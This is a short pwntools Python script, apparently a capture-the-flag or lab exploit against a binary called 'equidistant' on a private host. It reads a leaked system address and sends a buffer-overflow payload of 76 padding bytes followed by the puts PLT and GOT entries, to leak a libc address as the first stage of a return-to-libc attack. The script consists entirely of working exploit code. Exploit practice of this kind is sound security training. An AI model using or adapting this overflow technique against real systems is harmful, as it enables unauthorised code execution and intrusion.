from pwn import *
import requests

context.arch = 'i386'
context.log_level = 'info'

elf = ELF('./equidistant')

HOST, PORT = "10.213.0.102", 57563
OFFSET = 76

p = remote(HOST, PORT)

p.recvuntil(b"System addr: ")
system_addr = int(p.recvline(), 16)

payload = flat(
    b"A" * OFFSET,
    elf.plt['puts'],
    0xdeadbeef,          # adresa de retur dupa puts - nu conteaza, inchidem conexiunea oricum
    elf.got['puts'],
)
p.sendlineafter(b"name", payload)
p.recvuntil(b"Bye!\n")

